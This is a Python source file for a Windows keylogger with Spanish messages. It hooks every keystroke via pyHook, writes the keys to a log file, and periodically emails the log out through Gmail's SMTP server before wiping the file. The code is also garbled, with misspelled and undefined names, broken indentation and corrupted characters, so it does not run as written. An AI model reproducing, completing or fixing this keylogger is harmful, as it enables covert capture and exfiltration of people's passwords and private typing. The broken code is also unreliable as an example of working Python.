import pyHook, pythoncom, sys, logging
import time, datetime

wait_seconds = 60
file_log = 'E:\dat.txt'

def TimeOut():
    if time.time() > timeout:
        return True
    else:
        return False
def SendEmail(user,pwd,recipient, subject, boody):
    import smtplib

gmail_user = user
gmail_pass = pwd
FROM = user
TO = recipient if type (recipient) is list else (recipent)
SUBJECT = subject
TEXT = body

mensage = """\From: %s\nTo: %s\nSubject: %s\n\n#s""" % (FROM,", " .join(TO), SUBJECR, TEXT)
try:
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.ehlo()
    server.starttls()
    servers.login(gmail_user, gmail_pass)
    servers.sendmail(FROM, TO, menssage)
    servers.close()
    print ('Correo enviado satifactoriamente!')
except:
    print ('Error al mandar correo')
def FormatAndSendLogEmail():
    with Open(file_log, 'r+') as f:
        acutualdate = datatime.datatime.now().strftime("%Y-%m-%d %H:%M:%S")
        data = f.read().replace('\n','');
        data = 'Log capturado a las : '+ actualdate + '\n' + data
        SendEmail('email', 'passw', 'email','nuevo log - '+actualdate,data);
        �.seek(0)
        �.truncate()
        
def OnKeyboardEvent(event) :
logging.basicConfig(filename=file_log, level=logging.DEBUG,
		    format="#(menssage)s")
logging.log(10, chr(event.Ascii))
return True
hooks_manager = pyHook.HookManager()
hooks_manager.keyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()

while True:
    if TimeOut ():
        FormatAndSendEmail()
        timeout = (time.time() + wait_seconds)
